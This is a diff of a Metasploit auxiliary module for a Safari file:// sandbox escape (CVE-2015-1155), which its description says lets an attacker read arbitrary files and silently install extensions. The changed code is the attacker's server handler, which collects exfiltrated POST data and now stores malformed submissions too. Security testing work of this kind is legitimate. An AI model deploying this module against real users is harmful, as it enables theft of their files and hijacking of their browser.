@@ -16,11 +16,11 @@ class Metasploit3 < Msf::Auxiliary
     super(update_info(info,
       'Name'        => 'Mac OS X Safari file:// Redirection Sandbox Escape',
       'Description' => %q{
-        Due to an issue in the way Safari handles error page origins,
-        an attacker who can entice a user into visiting a malicious page
-        can gain a reference to the resulting error page in the file:// scheme.
-        From there, the attacker can access cross-domain globals, such as 'location'
-        and 'history,' which leads to a total compromise of the sandbox.
+        Versions of Safari before 8.0.6, 7.1.6, and 6.2.6 are vulnerable to a
+        "state management issue" that allows a browser window to be navigated
+        to a file:// URL. By dropping and loading a malicious .webarchive file,
+        an attacker can read arbitrary files, inject cross-domain Javascript, and
+        silently install Safari extensions.
       },
       'License'     => MSF_LICENSE,
       'Author'      => [
@@ -28,7 +28,8 @@ class Metasploit3 < Msf::Auxiliary
       ],
       'References'  => [
         ['ZDI', '15-288'],
-        ['CVE', '2015-1155']
+        ['CVE', '2015-1155'],
+        ['URL', 'https://support.apple.com/en-us/HT204826']
       ],
       'Platform'    => 'osx',
       'Targets'     =>
@@ -40,12 +41,11 @@ class Metasploit3 < Msf::Auxiliary
     ))
 
 
-    register_options(
-      [
-        OptString.new("URIPATH", [false, 'The URI to use for this exploit (default is random)']),
-        OptPort.new('SRVPORT',   [true, "The local port to use for the FTP server", 8081]),
-        OptPort.new('HTTPPORT',  [true, "The HTTP server port", 8080])
-      ], self.class )
+    register_options([
+      OptString.new("URIPATH", [false, 'The URI to use for this exploit (default is random)']),
+      OptPort.new('SRVPORT',   [true, "The local port to use for the FTP server", 8081]),
+      OptPort.new('HTTPPORT',  [true, "The HTTP server port", 8080])
+    ], self.class)
   end
 
   def lookup_lhost(c=nil)
@@ -59,19 +59,16 @@ class Metasploit3 < Msf::Auxiliary
 
   def on_request_uri(cli, req)
     if req.method =~ /post/i
+      data_str = req.body.to_s
       begin
-        data_str = if req.body.size > 0
-          req.body
-        else
-          req.qstring['data']
-        end
         data = JSON::parse(data_str || '')
         file = record_data(data, cli)
-        send_response(cli, 200, 'OK', '')
+        send_response_html(cli, '')
         print_good "data #{data.keys.join(',')} received and stored to #{file}"
       rescue JSON::ParserError => e # json error, dismiss request & keep crit. server up
-        print_error "Invalid JSON received."
-        send_not_found(cli)
+        file = record_data(data_str, cli)
+        print_error "Invalid JSON stored in #{file}"
+        send_response_html(cli, '')
       end
     elsif req.uri =~ /#{popup_path}$/
       send_response(cli, 200, 'OK', popup_html)
